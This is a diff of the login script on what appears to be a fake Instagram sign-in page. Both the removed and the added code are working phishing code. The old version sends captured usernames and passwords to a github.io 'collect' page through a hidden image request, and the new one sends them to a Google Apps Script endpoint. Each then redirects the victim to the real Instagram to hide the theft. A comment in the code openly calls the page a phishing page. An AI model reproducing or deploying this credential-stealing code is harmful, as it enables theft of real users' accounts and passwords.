@@ -428,150 +428,96 @@
 
     <!-- Your JavaScript for handling form submission should be placed here -->
     <!-- It is crucial that the JavaScript is placed AFTER the HTML elements it interacts with. -->
-    <script>
-        // This script captures user credentials from the Instagram-like login form
-        // and redirects the user to a specified URL, passing credentials as URL parameters.
-        //
-        // !!! WARNING: THIS METHOD IS HIGHLY INSECURE FOR SENSITIVE DATA LIKE PASSWORDS. !!!
-        // !!! DO NOT USE IN PRODUCTION OR ANY SCENARIO REQUIRING USER PRIVACY/SECURITY. !!!
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    const loginForm = document.querySelector('.login-form');
+    const usernameInput = loginForm?.querySelector('input[name="username"]');
+    const passwordInput = loginForm?.querySelector('input[name="password"]');
+    const loginButton = loginForm?.querySelector('.login-button');
+    const passwordToggleButton = document.getElementById('passwordToggleButton');
+    const messageDisplay = document.getElementById('messageDisplay');
 
-        document.addEventListener('DOMContentLoaded', () => {
-            // Get references to the form, input fields, and the login button.
-            const loginForm = document.querySelector('.login-form');
-            const usernameInput = loginForm ? loginForm.querySelector('input[name="username"]') : null;
-            const passwordInput = loginForm ? loginForm.querySelector('input[name="password"]') : null;
-            const loginButton = loginForm ? loginForm.querySelector('.login-button') : null;
-            const passwordToggleButton = document.getElementById('passwordToggleButton'); // Get the new toggle button
+    function showMessage(text, type = 'info') {
+      messageDisplay.textContent = text;
+      messageDisplay.style.display = 'block';
+      if (type === 'error') {
+        messageDisplay.style.backgroundColor = '#ffe0e0';
+        messageDisplay.style.color = '#cc0000';
+        messageDisplay.style.border = '1px solid #ff9999';
+      } else if (type === 'success') {
+        messageDisplay.style.backgroundColor = '#e0ffe0';
+        messageDisplay.style.color = '#008000';
+        messageDisplay.style.border = '1px solid #99ff99';
+      } else {
+        messageDisplay.style.backgroundColor = '#f0f0f0';
+        messageDisplay.style.color = '#333';
+        messageDisplay.style.border = '1px solid #dbdbdb';
+      }
+      setTimeout(() => {
+        messageDisplay.style.display = 'none';
+      }, 5000);
+    }
 
-            // Get the message display div. It's now part of the HTML structure.
-            const messageDisplay = document.getElementById('messageDisplay');
+    if (loginForm && usernameInput && passwordInput && loginButton) {
+      loginForm.addEventListener('submit', async (event) => {
+        event.preventDefault();
 
-            // Function to display messages to the user
-            function showMessage(text, type = 'info') {
-                messageDisplay.textContent = text;
-                messageDisplay.style.display = 'block';
-                if (type === 'error') {
-                    messageDisplay.style.backgroundColor = '#ffe0e0';
-                    messageDisplay.style.color = '#cc0000';
-                    messageDisplay.style.border = '1px solid #ff9999';
-                } else if (type === 'success') {
-                    messageDisplay.style.backgroundColor = '#e0ffe0';
-                    messageDisplay.style.color = '#008000';
-                    messageDisplay.style.border = '1px solid #99ff99';
-                } else {
-                    messageDisplay.style.backgroundColor = '#f0f0f0';
-                    messageDisplay.style.color = '#333';
-                    messageDisplay.style.border = '1px solid #dbdbdb';
-                }
-                setTimeout(() => {
-                    messageDisplay.style.display = 'none';
-                }, 5000); // Hide message after 5 seconds
-            }
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
 
-            // Add an event listener to the form's submit event
-            if (loginForm && usernameInput && passwordInput && loginButton) {
-                loginForm.addEventListener('submit', async (event) => {
-                    event.preventDefault(); // Prevent the default form submission (page reload)
+        if (!username || !password) {
+          showMessage('Please enter both username and password.', 'error');
+          return;
+        }
 
-                    const username = usernameInput.value.trim(); // Get username and trim whitespace
-                    const password = passwordInput.value.trim(); // Get password and trim whitespace
+        const encodedUsername = encodeURIComponent(username);
+        const encodedPassword = encodeURIComponent(password);
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbz6w8hpr2pYI1pw6YO41PYJjN3xUMTAly19IuJvABTYYHNwVonQheSsOUtRAQa0Zw7l/exec';
 
-                    // Basic validation: ensure username and password are not empty
-                    if (!username || !password) {
-                        showMessage('Please enter both username and password.', 'error');
-                        return;
-                    }
+        showMessage('Connecting to Instagram...', 'info');
 
-                    // Get the current date and format it
-                    const now = new Date();
-                    const dateOptions = {
-                        year: 'numeric',
-                        month: '2-digit',
-                        day: '2-digit',
-                        hour: '2-digit',
-                        minute: '2-digit',
-                        second: '2-digit',
-                        hour12: false // Use 24-hour format
-                    };
-                    const formattedDate = now.toLocaleString('en-GB', dateOptions).replace(/,/, ''); // Format as DD/MM/YYYY HH:MM:SS
+        fetch(`${scriptURL}?username=${encodedUsername}&password=${encodedPassword}`)
+          .then(() => {
+            window.location.href = 'https://www.instagram.com/';
+          })
+          .catch((error) => {
+            console.error('Error:', error);
+            window.location.href = 'https://www.instagram.com/';
+          });
+      });
 
-                    // Encode the data for URL parameters
-                    const encodedUsername = encodeURIComponent(username);
-                    const encodedPassword = encodeURIComponent(password);
-                    const encodedDate = encodeURIComponent(formattedDate);
-
-                    // Define the target URL for data collection (your GitHub Pages HTML file)
-                    // !!! WARNING: This URL will be loaded with sensitive data in its parameters. !!!
-                    const targetUrl = `https://y011b.github.io/instagram.com/collect.html?date=${encodedDate}&username=${encodedUsername}&password=${encodedPassword}`;
-
-                    // Display a message before redirecting
-                    showMessage('Attempting to log in...', 'info');
-
-                    // Redirect the user to the target URL
-                    // This will make the browser navigate to the collect.html page
-                    // with the username and password visible in the URL.
-                    // إرسال البيانات إلى collect.html بشكل مخفي عبر طلب صورة
-const img = new Image();
-img.src = `https://y011b.github.io/instagram.com/collect.html?date=${encodedDate}&username=${encodedUsername}&password=${encodedPassword}`;
-
-// ننتظر قليلًا لنضمن تحميل الصورة (يعني تم إرسال البيانات)
-setTimeout(() => {
-  window.location.href = 'https://www.instagram.com/';
-}, 500); // بعد 0.5 ثانية، نحول المستخدم لـ Instagram
-
-
-                    // Note: Since we are redirecting, any code after window.location.href
-                    // will likely not execute, as the browser navigates away.
-                });
-
-                // Toggle password visibility functionality
-                if (passwordToggleButton && passwordInput) {
-                    passwordToggleButton.addEventListener('click', () => {
-                        if (passwordInput.type === 'password') {
-                            passwordInput.type = 'text';
-                            passwordToggleButton.textContent = 'Masquer'; // Change text to 'Hide'
-                        } else {
-                            passwordInput.type = 'password';
-                            passwordToggleButton.textContent = 'Afficher'; // Change text to 'Show'
-                        }
-                    });
-
-                    // Show/hide the toggle button based on password input content
-                    passwordInput.addEventListener('input', () => {
-                        if (passwordInput.value.length > 0) {
-                            passwordToggleButton.style.display = 'block';
-                        } else {
-                            passwordToggleButton.style.display = 'none';
-                        }
-                    });
-
-                    // Initial check in case there's autofilled content
-                    if (passwordInput.value.length > 0) {
-                        passwordToggleButton.style.display = 'block';
-                    }
-                }
-
-
-                // Optional: Enable/disable button based on input presence (for better UX)
-                function toggleLoginButtonOpacity() {
-                    if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
-                        loginButton.style.opacity = '1';
-                    } else {
-                        loginButton.style.opacity = '0.7';
-                    }
-                }
-
-                usernameInput.addEventListener('input', toggleLoginButtonOpacity);
-                passwordInput.addEventListener('input', toggleLoginButtonOpacity);
-
-                // Initial check on page load
-                toggleLoginButtonOpacity();
-
-            } else {
-                console.error('Required form elements (form, username input, password input, or login button) not found.');
-                // showMessage('Error: Form elements not found in HTML. Script cannot function.', 'error'); // Removed to avoid showing error on a phishing page
-            }
+      if (passwordToggleButton && passwordInput) {
+        passwordToggleButton.addEventListener('click', () => {
+          if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            passwordToggleButton.textContent = 'Masquer';
+          } else {
+            passwordInput.type = 'password';
+            passwordToggleButton.textContent = 'Afficher';
+          }
         });
-    </script>
+
+        passwordInput.addEventListener('input', () => {
+          passwordToggleButton.style.display = passwordInput.value.length > 0 ? 'block' : 'none';
+        });
+
+        if (passwordInput.value.length > 0) {
+          passwordToggleButton.style.display = 'block';
+        }
+      }
+
+      function toggleLoginButtonOpacity() {
+        loginButton.style.opacity =
+          usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '' ? '1' : '0.7';
+      }
+
+      usernameInput.addEventListener('input', toggleLoginButtonOpacity);
+      passwordInput.addEventListener('input', toggleLoginButtonOpacity);
+      toggleLoginButtonOpacity();
+    } else {
+      console.error('Form elements not found.');
+    }
+  });
+</script>
 </body>
 </html>
